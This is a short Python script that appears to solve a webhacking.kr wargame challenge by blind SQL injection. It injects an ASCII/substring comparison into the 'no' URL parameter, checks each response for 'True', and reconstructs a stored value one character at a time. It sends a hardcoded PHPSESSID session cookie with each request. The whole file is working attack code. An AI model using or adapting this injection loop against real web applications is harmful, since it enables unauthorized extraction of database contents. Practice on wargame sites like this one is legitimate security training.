import requests

session_id={'PHPSESSID':'3bb4704306121d9eb5a07907db12a43b'}

password=''
for j in range(1,20):
	for i in range(33,122):
		url = "http://webhacking.kr/challenge/bonus/bonus-1/?no=1 and ascii(substr(id,"+str(j)+",1))="+str(i)
		respone = requests.get(url=url,cookies=session_id)
		print(chr(i))
		if "True" in respone.text:
			password+=chr(i)
			print("password : " ,password)
			break
			
print("password : ",password)

